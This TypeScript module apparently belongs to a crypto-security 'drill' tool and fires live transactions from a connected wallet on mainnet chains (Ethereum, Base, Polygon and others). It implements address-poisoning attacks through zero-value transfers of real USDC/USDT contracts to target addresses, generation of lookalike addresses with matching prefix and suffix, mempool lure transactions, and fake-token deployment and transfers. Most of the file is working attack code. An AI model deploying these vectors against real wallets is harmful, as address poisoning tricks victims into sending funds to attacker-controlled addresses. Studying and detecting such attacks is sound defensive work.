/**
 * Client-side trigger broadcast via the admin's linked EIP-1193 wallet
 * (MetaMask / Trust Wallet / Rabby / WalletConnect). No seed phrases,
 * no demo signer — the connected wallet signs in-browser.
 */

import {
  encodeFunctionData,
  getAddress,
  isAddress,
  parseEther,
  type Hash,
  type Hex,
} from "viem";
import { FAKE_TOKEN_BYTECODE } from "./fakeTokenArtifact";
import {
  getActiveWalletAddress,
  getActiveWalletProvider,
  type Eip1193Provider,
} from "./walletProvider";
import { walletErrorMessage } from "./walletErrors";

export type ClientVector = "mempoolLure" | "addressPoisoning" | "fakeTokenTransfer" | "zeroValue";

const TRANSFER_ABI = [
  {
    name: "transfer",
    type: "function",
    stateMutability: "nonpayable",
    inputs: [
      { name: "to", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    outputs: [{ name: "", type: "bool" }],
  },
] as const;

/**
 * Chain-aware default tokens for zero-value transfers (real, verified ERC-20s).
 * A `transfer(target, 0)` emits a real Transfer event with zero balance delta —
 * the classic zero-value poisoning pattern — without needing a custom contract.
 * Supports USDC, USDT, and native wrapped tokens per chain.
 */
const ZERO_VALUE_DEFAULT_TOKENS: Record<number, Record<string, `0x${string}`>> = {
  8453: {
    USDC: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
    USDT: "0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2",
    WETH: "0x4200000000000000000000000000000000000006",
  },
  1: {
    USDC: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
    USDT: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    WETH: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
    WBTC: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",
  },
  137: {
    USDC: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
    USDT: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
    WMATIC: "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270",
    WETH: "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619",
  },
  42161: {
    USDC: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831",
    USDT: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
    WETH: "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1",
  },
  10: {
    USDC: "0x7F5c764cBc14f9669B88837ca1490cCa17c3560e",
    USDT: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",
    WETH: "0x4200000000000000000000000000000000000006",
  },
  56: {
    USDC: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
    USDT: "0x55d398326f99059fF775485246999027B3197955",
    WBNB: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
    BTCB: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c",
  },
  43114: {
    USDC: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E",
    USDT: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7",
    WAVAX: "0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7",
    WETH: "0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB",
  },
};

export type TokenSymbol = "USDC" | "USDT" | "WETH" | "WBTC" | "WMATIC" | "WBNB" | "BTCB" | "WAVAX";

export function resolveZeroValueToken(
  chainId: number | undefined,
  override: string | undefined,
  tokenSymbol?: TokenSymbol
): `0x${string}` {
  if (override && override.trim()) {
    if (!isAddress(override.trim())) {
      throw new Error("Contract override is not a valid EVM address.");
    }
    return getAddress(override.trim());
  }
  if (!chainId) {
    throw new Error("Chain ID required to resolve default token.");
  }
  const chainTokens = ZERO_VALUE_DEFAULT_TOKENS[chainId];
  if (!chainTokens) {
    throw new Error(`No tokens configured for chain ${chainId}.`);
  }
  const symbol = tokenSymbol || "USDC";
  const token = chainTokens[symbol];
  if (!token) {
    const available = Object.keys(chainTokens).join(", ");
    throw new Error(`Token ${symbol} not available on chain ${chainId}. Available: ${available}`);
  }
  return token;
}

/**
 * Generate a lookalike address for address poisoning attacks.
 * Creates an address with same prefix/suffix as target but different middle.
 */
export function generateLookalikeAddress(targetAddress: string): string {
  const normalized = getAddress(targetAddress);
  const prefix = normalized.slice(0, 6); // 0x + 4 chars
  const suffix = normalized.slice(-4);
  // Generate random middle bytes
  const middleBytes = new Uint8Array(10);
  if (typeof window !== "undefined" && window.crypto) {
    window.crypto.getRandomValues(middleBytes);
  } else {
    // Fallback for non-browser
    for (let i = 0; i < middleBytes.length; i++) {
      middleBytes[i] = Math.floor(Math.random() * 256);
    }
  }
  const middle = Array.from(middleBytes)
    .map((b) => b.toString(16).padStart(2, "0"))
    .join("");
  return `${prefix}${middle}${suffix}` as `0x${string}`;
}

export type ClientTriggerResult = {
  txHash: Hash;
  vector: "MEMPOOL_SPOOF_LURE" | "ADDRESS_POISONING" | "FAKE_TOKEN_TRANSFER";
  targetAddress: string;
  fromAddress: string;
  broadcastAt: string;
  lookalikeAddress?: string;
};

function requireProvider(): { provider: Eip1193Provider; from: string } {
  const provider = getActiveWalletProvider();
  const from = getActiveWalletAddress();
  if (!provider || !from) {
    throw new Error("Connect a wallet to sign.");
  }
  return { provider, from };
}

const CHAIN_META: Record<
  number,
  { chainName: string; rpcUrls: string[]; nativeCurrency: { name: string; symbol: string; decimals: number }; blockExplorerUrls: string[] }
> = {
  8453: {
    chainName: "Base",
    rpcUrls: ["https://mainnet.base.org"],
    nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
    blockExplorerUrls: ["https://basescan.org"],
  },
  1: {
    chainName: "Ethereum",
    rpcUrls: ["https://cloudflare-eth.com"],
    nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
    blockExplorerUrls: ["https://etherscan.io"],
  },
  137: {
    chainName: "Polygon",
    rpcUrls: ["https://polygon-rpc.com"],
    nativeCurrency: { name: "MATIC", symbol: "MATIC", decimals: 18 },
    blockExplorerUrls: ["https://polygonscan.com"],
  },
  42161: {
    chainName: "Arbitrum One",
    rpcUrls: ["https://arb1.arbitrum.io/rpc"],
    nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
    blockExplorerUrls: ["https://arbiscan.io"],
  },
  10: {
    chainName: "Optimism",
    rpcUrls: ["https://mainnet.optimism.io"],
    nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
    blockExplorerUrls: ["https://optimistic.etherscan.io"],
  },
  56: {
    chainName: "BNB Smart Chain",
    rpcUrls: ["https://bsc-dataseed.binance.org"],
    nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
    blockExplorerUrls: ["https://bscscan.com"],
  },
  43114: {
    chainName: "Avalanche C-Chain",
    rpcUrls: ["https://api.avax.network/ext/bc/C/rpc"],
    nativeCurrency: { name: "AVAX", symbol: "AVAX", decimals: 18 },
    blockExplorerUrls: ["https://snowtrace.io"],
  },
};

async function sendTx(
  provider: Eip1193Provider,
  tx: {
    from: string;
    /** Omitted for contract-creation (deploy) transactions. */
    to?: string;
    data?: Hex;
    value?: Hex;
    maxFeePerGas?: Hex;
    maxPriorityFeePerGas?: Hex;
  }
): Promise<Hash> {
  try {
    const hash = (await provider.request({
      method: "eth_sendTransaction",
      params: [tx],
    })) as string;
    if (!hash || typeof hash !== "string" || !hash.startsWith("0x")) {
      throw new Error("No transaction hash.");
    }
    return hash as Hash;
  } catch (err) {
    throw new Error(walletErrorMessage(err, "Transaction failed."));
  }
}

/** Retry a promise with exponential backoff. */
async function retryWithBackoff<T>(
  fn: () => Promise<T>,
  retries = 3,
  baseDelay = 500
): Promise<T> {
  try {
    return await fn();
  } catch (err) {
    if (retries <= 0) throw err;
    await new Promise((r) => setTimeout(r, baseDelay));
    return retryWithBackoff(fn, retries - 1, baseDelay * 2);
  }
}

/** Ask wallet to switch (and add if missing) to the configured chain. */
export async function ensureWalletChain(chainId: number): Promise<void> {
  const { provider } = requireProvider();
  const hexId = `0x${chainId.toString(16)}`;
  try {
    const current = (await provider.request({ method: "eth_chainId" })) as string;
    if (current?.toLowerCase() === hexId.toLowerCase()) return;
    await provider.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: hexId }],
    });
  } catch (err) {
    const code =
      err && typeof err === "object" && "code" in err ? Number((err as { code: unknown }).code) : NaN;
    const msg = err instanceof Error ? err.message : String(err);
    if (code === 4001 || /user rejected|denied/i.test(msg)) {
      throw new Error("Rejected in wallet.");
    }
    const meta = CHAIN_META[chainId];
    if (meta && (code === 4902 || /unrecognized chain|unknown chain/i.test(msg))) {
      try {
        await provider.request({
          method: "wallet_addEthereumChain",
          params: [
            {
              chainId: hexId,
              chainName: meta.chainName,
              rpcUrls: meta.rpcUrls,
              nativeCurrency: meta.nativeCurrency,
              blockExplorerUrls: meta.blockExplorerUrls,
            },
          ],
        });
        return;
      } catch (addErr) {
        throw new Error(walletErrorMessage(addErr, `Add chain ${chainId} in wallet.`));
      }
    }
    throw new Error(walletErrorMessage(err, `Switch wallet to chain ${chainId}.`));
  }
}

export async function fireMempoolLureFromWallet(
  targetAddress: string,
  amountEth = "0.001",
  chainId?: number
): Promise<ClientTriggerResult> {
  const { provider, from } = requireProvider();
  if (chainId) await ensureWalletChain(chainId);

  // Deliberately low tip/fee hint — wallet may override; still a live lure tx.
  const value = `0x${parseEther(amountEth).toString(16)}` as Hex;
  const txHash = await sendTx(provider, {
    from,
    to: targetAddress,
    value,
    maxPriorityFeePerGas: "0x1",
  });

  return {
    txHash,
    vector: "MEMPOOL_SPOOF_LURE",
    targetAddress,
    fromAddress: from,
    broadcastAt: new Date().toISOString(),
  };
}

export async function fireAddressPoisoningFromWallet(
  targetAddress: string,
  fakeTokenContract?: string, // Optional - if not provided, uses zero-value transfer on real ERC-20
  chainId?: number
): Promise<ClientTriggerResult> {
  const { provider, from } = requireProvider();
  if (chainId) await ensureWalletChain(chainId);

  // If no fake token contract provided, use zero-value transfer on real ERC-20 (USDC)
  // This is the standard address poisoning pattern: transfer(target, 0) on a real token
  if (!fakeTokenContract) {
    const token = resolveZeroValueToken(chainId, undefined, "USDC");
    const data = encodeFunctionData({
      abi: TRANSFER_ABI,
      functionName: "transfer",
      args: [getAddress(targetAddress), 0n],
    });

    const txHash = await sendTx(provider, {
      from,
      to: token,
      data,
    });

    // Generate a lookalike address for the poisoning attack
    const lookalikeAddress = generateLookalikeAddress(targetAddress);

    return {
      txHash,
      vector: "ADDRESS_POISONING",
      targetAddress,
      fromAddress: from,
      broadcastAt: new Date().toISOString(),
      lookalikeAddress,
    };
  }

  // Legacy: custom fake token contract with emitPoisonedTransfer
  const data = encodeFunctionData({
    abi: [
      {
        name: "emitPoisonedTransfer",
        type: "function",
        stateMutability: "nonpayable",
        inputs: [{ name: "to", type: "address" }],
        outputs: [],
      },
    ] as const,
    functionName: "emitPoisonedTransfer",
    args: [targetAddress as `0x${string}`],
  });

  const txHash = await sendTx(provider, {
    from,
    to: fakeTokenContract,
    data,
  });

  return {
    txHash,
    vector: "ADDRESS_POISONING",
    targetAddress,
    fromAddress: from,
    broadcastAt: new Date().toISOString(),
  };
}

export async function fireFakeTokenTransferFromWallet(
  targetAddress: string,
  fakeTokenContract: string,
  amount = "1000000000000000000",
  chainId?: number
): Promise<ClientTriggerResult> {
  const { provider, from } = requireProvider();
  if (chainId) await ensureWalletChain(chainId);

  const data = encodeFunctionData({
    abi: [
      {
        name: "transfer",
        type: "function",
        stateMutability: "nonpayable",
        inputs: [
          { name: "to", type: "address" },
          { name: "amount", type: "uint256" },
        ],
        outputs: [{ name: "", type: "bool" }],
      },
    ] as const,
    functionName: "transfer",
    args: [targetAddress as `0x${string}`, BigInt(amount)],
  });

  const txHash = await sendTx(provider, {
    from,
    to: fakeTokenContract,
    data,
  });

  return {
    txHash,
    vector: "FAKE_TOKEN_TRANSFER",
    targetAddress,
    fromAddress: from,
    broadcastAt: new Date().toISOString(),
  };
}

/**
 * Zero-value token transfer: calls transfer(target, 0) on a real ERC-20
 * (chain default, or Contract-field override). Emits Transfer(from, target, 0)
 * with no balance movement — the exact pattern the verifier flags as
 * ADDRESS_POISONING. No custom contract deployment needed.
 */
export async function fireZeroValueTransferFromWallet(
  targetAddress: string,
  tokenOverride?: string,
  chainId?: number,
  tokenSymbol?: TokenSymbol
): Promise<ClientTriggerResult> {
  const { provider, from } = requireProvider();
  if (!isAddress(targetAddress)) {
    throw new Error("Target is not a valid EVM address.");
  }
  const token = resolveZeroValueToken(chainId, tokenOverride, tokenSymbol);
  if (chainId) await ensureWalletChain(chainId);

  const data = encodeFunctionData({
    abi: TRANSFER_ABI,
    functionName: "transfer",
    args: [getAddress(targetAddress), 0n],
  });

  const txHash = await sendTx(provider, {
    from,
    to: token,
    data,
  });

  const lookalikeAddress = generateLookalikeAddress(targetAddress);

  return {
    txHash,
    vector: "ADDRESS_POISONING",
    targetAddress: getAddress(targetAddress),
    fromAddress: from,
    broadcastAt: new Date().toISOString(),
    lookalikeAddress,
  };
}

export type DeployTokenResult = {
  contractAddress: string;
  txHash: Hash;
  deployer: string;
  broadcastAt: string;
};

/**
 * Deploys the drill FakeToken (3GTT) with the connected wallet: a
 * contract-creation tx (no `to`) carrying the compiled bytecode. The full
 * initial supply is minted to the deployer, so fake-token vectors can move
 * real drill balances right after. Waits for the receipt to return the
 * contract address (up to ~3 min).
 */
export async function deployFakeTokenFromWallet(chainId?: number): Promise<DeployTokenResult> {
  const { provider, from } = requireProvider();
  if (chainId) await ensureWalletChain(chainId);

  const txHash = await sendTx(provider, {
    from,
    data: FAKE_TOKEN_BYTECODE as Hex,
  });

  const deadline = Date.now() + 180000;
  while (Date.now() < deadline) {
    await new Promise((r) => setTimeout(r, 2500));
    const receipt = (await provider.request({
      method: "eth_getTransactionReceipt",
      params: [txHash],
    })) as { contractAddress?: string } | null;
    if (receipt?.contractAddress && isAddress(receipt.contractAddress)) {
      return {
        contractAddress: getAddress(receipt.contractAddress),
        txHash,
        deployer: from,
        broadcastAt: new Date().toISOString(),
      };
    }
  }
  throw new Error(`Deploy pending: ${txHash}. Paste contract when mined.`);
}

export async function fireVectorFromLinkedWallet(input: {
  vector: ClientVector;
  targetAddress: string;
  fakeTokenContract?: string;
  amount?: string;
  chainId?: number;
  tokenSymbol?: TokenSymbol;
}): Promise<ClientTriggerResult> {
  switch (input.vector) {
    case "mempoolLure":
      return fireMempoolLureFromWallet(
        input.targetAddress,
        input.amount ?? "0.001",
        input.chainId
      );
    case "addressPoisoning":
      return fireAddressPoisoningFromWallet(
        input.targetAddress,
        input.fakeTokenContract,
        input.chainId
      );
    case "fakeTokenTransfer":
      if (!input.fakeTokenContract) {
        throw new Error("Contract required.");
      }
      return fireFakeTokenTransferFromWallet(
        input.targetAddress,
        input.fakeTokenContract,
        input.amount ?? "1000000000000000000",
        input.chainId
      );
    case "zeroValue":
      return fireZeroValueTransferFromWallet(
        input.targetAddress,
        input.fakeTokenContract,
        input.chainId,
        input.tokenSymbol
      );
    default:
      throw new Error(`Unknown vector: ${input.vector}`);
  }
}
